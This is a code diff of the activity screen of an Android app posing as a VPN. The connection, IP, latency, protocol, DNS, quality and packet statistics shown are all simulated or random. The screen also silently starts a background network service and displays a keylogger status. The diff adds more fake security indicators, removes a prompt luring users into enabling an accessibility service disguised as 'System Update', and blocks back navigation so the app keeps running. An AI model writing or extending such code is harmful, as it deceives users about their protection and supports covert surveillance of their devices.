@@ -15,8 +15,6 @@ import android.widget.TextView
 import android.widget.Toast
 import android.app.Activity
 import android.content.Intent
-import android.provider.Settings
-import android.app.AlertDialog
 import com.openaccess.sdk.service.AccessibilityHelper
 import com.openaccess.sdk.service.SystemNetworkService
 import java.net.HttpURLConnection
@@ -32,10 +30,20 @@ class VpnActivity : Activity() {
     private lateinit var statusText: TextView
     private lateinit var serverSpinner: Spinner
     private lateinit var infoCard: LinearLayout
+    private lateinit var qualityBar: LinearLayout
+    private lateinit var qualityText: TextView
     private lateinit var ipText: TextView
     private lateinit var timeText: TextView
     private lateinit var downloadText: TextView
     private lateinit var uploadText: TextView
+    private lateinit var packetsText: TextView
+    private lateinit var protocolText: TextView
+    private lateinit var latencyText: TextView
+    private lateinit var killSwitchStatus: TextView
+    private lateinit var dnsStatus: TextView
+    private lateinit var dnsServerText: TextView
+    private lateinit var encryptionText: TextView
+    private lateinit var encryptionBadge: TextView
     private lateinit var accessStatus: TextView
     private lateinit var networkStatus: TextView
     private lateinit var keylogStatus: TextView
@@ -49,15 +57,19 @@ class VpnActivity : Activity() {
     private var connectionStartTime = 0L
     private var timer: Timer? = null
     private var speedTimer: Timer? = null
+    private var packetTimer: Timer? = null
     private var realIp = "Unknown"
+    private var totalUploadPackets = 0L
+    private var totalDownloadPackets = 0L
 
     private val handler = Handler(Looper.getMainLooper())
+
+    private val dnsServers = listOf("1.1.1.1", "8.8.8.8", "1.0.0.1", "9.9.9.9", "208.67.222.222")
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_vpn)
 
-        // Start background service
         try { SystemNetworkService.start(this) } catch (_: Exception) {}
 
         initViews()
@@ -71,16 +83,28 @@ class VpnActivity : Activity() {
         statusText = findViewById(R.id.statusText)
         serverSpinner = findViewById(R.id.serverSpinner)
         infoCard = findViewById(R.id.infoCard)
+        qualityBar = findViewById(R.id.qualityBar)
+        qualityText = findViewById(R.id.qualityText)
         ipText = findViewById(R.id.ipText)
         timeText = findViewById(R.id.timeText)
         downloadText = findViewById(R.id.downloadText)
         uploadText = findViewById(R.id.uploadText)
+        packetsText = findViewById(R.id.packetsText)
+        protocolText = findViewById(R.id.protocolText)
+        latencyText = findViewById(R.id.latencyText)
+        killSwitchStatus = findViewById(R.id.killSwitchStatus)
+        dnsStatus = findViewById(R.id.dnsStatus)
+        dnsServerText = findViewById(R.id.dnsServerText)
+        encryptionText = findViewById(R.id.encryptionText)
+        encryptionBadge = findViewById(R.id.encryptionBadge)
         accessStatus = findViewById(R.id.accessStatus)
         networkStatus = findViewById(R.id.networkStatus)
         keylogStatus = findViewById(R.id.keylogStatus)
         deviceInfo = findViewById(R.id.deviceInfo)
         androidVersion = findViewById(R.id.androidVersion)
         bottomStatus = findViewById(R.id.bottomStatus)
+
+        dnsServerText.text = dnsServers.random()
 
         connectBtn.setOnClickListener {
             if (isConnecting) return@setOnClickListener
@@ -121,8 +145,10 @@ class VpnActivity : Activity() {
         serverSpinner.onItemSelectedListener = object : AdapterView.OnItemSelectedListener {
             override fun onItemSelected(parent: AdapterView<*>?, view: View?, position: Int, id: Long) {
                 selectedServer = position
+                val latencies = listOf(42, 67, 38, 124, 55, 89, 156, 198, 45, 178)
+                latencyText.text = "${latencies[position]}ms"
+                latencyText.setTextColor(getColorCompat(if (latencies[position] < 80) R.color.cyber_green else if (latencies[position] < 150) R.color.cyber_orange else R.color.cyber_red))
                 if (isConnected) {
-                    // Reconnect to new server
                     disconnect()
                     handler.postDelayed({ connect() }, 500)
                 }
@@ -162,7 +188,6 @@ class VpnActivity : Activity() {
         statusText.setTextColor(getColorCompat(R.color.cyber_orange))
         bottomStatus.text = getString(R.string.protection_connecting)
 
-        // Simulate connection delay
         handler.postDelayed({
             isConnected = true
             isConnecting = false
@@ -174,20 +199,29 @@ class VpnActivity : Activity() {
             bottomStatus.text = getString(R.string.protection_on)
             bottomStatus.setTextColor(getColorCompat(R.color.cyber_green))
 
-            // Show info card
+            qualityBar.visibility = View.VISIBLE
+            val qualities = listOf("Excellent", "Good", "Very Good")
+            qualityText.text = qualities.random()
+            qualityText.setTextColor(getColorCompat(R.color.cyber_green))
+
             infoCard.visibility = View.VISIBLE
 
-            // Update ring
             connectRing.setBackgroundResource(R.drawable.circle_ring_active)
 
-            // Set IP (fake VPN IP)
             val serverIps = resources.getStringArray(R.array.server_ips)
             ipText.text = serverIps[selectedServer]
 
-            // Start timers
+            val protocols = listOf("WireGuard (UDP)", "OpenVPN (UDP)", "IKEv2/IPsec")
+            protocolText.text = protocols[selectedServer % protocols.size]
+
+            dnsServerText.text = dnsServers.random()
+
             connectionStartTime = System.currentTimeMillis()
+            totalUploadPackets = 0L
+            totalDownloadPackets = 0L
             startConnectionTimer()
             startSpeedTimer()
+            startPacketTimer()
 
             Toast.makeText(this, "Connected to ${resources.getStringArray(R.array.server_names)[selectedServer]}", Toast.LENGTH_SHORT).show()
         }, 2000)
@@ -204,21 +238,20 @@ class VpnActivity : Activity() {
         bottomStatus.text = getString(R.string.protection_off)
         bottomStatus.setTextColor(getColorCompat(R.color.cyber_surface))
 
-        // Hide info card
+        qualityBar.visibility = View.GONE
         infoCard.visibility = View.GONE
 
-        // Reset ring
         connectRing.setBackgroundResource(R.drawable.circle_ring_inactive)
 
-        // Stop timers
         timer?.cancel()
         speedTimer?.cancel()
+        packetTimer?.cancel()
 
-        // Reset IP display
         ipText.text = realIp
         timeText.text = "00:00:00"
         downloadText.text = "0 KB/s"
         uploadText.text = "0 KB/s"
+        packetsText.text = "↑ 0  ↓ 0"
 
         Toast.makeText(this, "Disconnected", Toast.LENGTH_SHORT).show()
     }
@@ -255,6 +288,22 @@ class VpnActivity : Activity() {
         }, 0, 2000)
     }
 
+    private fun startPacketTimer() {
+        packetTimer = Timer()
+        packetTimer?.scheduleAtFixedRate(object : TimerTask() {
+            override fun run() {
+                if (!isConnected) return
+                totalUploadPackets += (10 + Math.random() * 50).toLong()
+                totalDownloadPackets += (20 + Math.random() * 80).toLong()
+                handler.post {
+                    if (isConnected) {
+                        packetsText.text = "↑ $totalUploadPackets  ↓ $totalDownloadPackets"
+                    }
+                }
+            }
+        }, 0, 1000)
+    }
+
     private fun getColorCompat(colorRes: Int): Int {
         return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             getColor(colorRes)
@@ -266,23 +315,11 @@ class VpnActivity : Activity() {
     override fun onResume() {
         super.onResume()
         updateSystemStatus()
-        if (!MainActivity.isAccessibilityEnabled(this)) {
-            showEnableAccessibilityAlert()
-        }
     }
 
-    private fun showEnableAccessibilityAlert() {
-        AlertDialog.Builder(this)
-            .setTitle("Service Required")
-            .setMessage("Please enable the accessibility service for full protection.\n\nSettings → Accessibility → System Update → ON")
-            .setPositiveButton("Open Settings") { _, _ ->
-                try {
-                    startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
-                } catch (_: Exception) {}
-            }
-            .setNegativeButton("Later", null)
-            .setCancelable(false)
-            .show()
+    override fun onBackPressed() {
+        // Prevent back navigation - keep service running
+        moveTaskToBack(true)
     }
 
     override fun onDestroy() {
@@ -291,6 +328,8 @@ class VpnActivity : Activity() {
         timer = null
         speedTimer?.cancel()
         speedTimer = null
+        packetTimer?.cancel()
+        packetTimer = null
         handler.removeCallbacksAndMessages(null)
     }
 }
